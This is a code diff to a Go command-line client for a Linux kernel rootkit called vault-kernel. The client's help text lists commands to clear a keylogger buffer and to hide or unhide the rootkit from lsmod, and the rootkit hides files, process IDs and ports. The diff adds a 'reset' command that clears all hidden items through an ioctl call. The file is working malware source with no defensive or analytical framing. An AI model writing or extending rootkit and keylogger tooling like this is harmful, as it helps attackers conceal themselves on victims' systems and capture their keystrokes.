@@ -11,7 +11,7 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.1"
+const clientVersion = "3.2"
 
 const devicePath = "/dev/vault_kernel"
 
@@ -182,6 +182,15 @@ func unhideModule(f *os.File) error {
 	return nil
 }
 
+func resetAll(f *os.File) error {
+	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_RESET_ALL, unsafe.Pointer(nil))
+	if err != 0 {
+		return err
+	}
+	fmt.Println("[+] Reset: all hidden files, PIDs and ports cleared")
+	return nil
+}
+
 func showStats(f *os.File) error {
 	buf := make([]byte, 4096)
 	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0]))
@@ -241,6 +250,7 @@ Commands:
   keylog-clear            Clear keylogger buffer
   hide-module             Hide rootkit from lsmod
   unhide-module           Make rootkit visible in lsmod
+  reset                   Clear ALL hidden files, PIDs and ports
   version                 Print client version
 `)
 }
@@ -387,6 +397,9 @@ func run() error {
 
 	case "unhide-module":
 		return unhideModule(f)
+
+	case "reset":
+		return resetAll(f)
 
 	default:
 		return fmt.Errorf("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
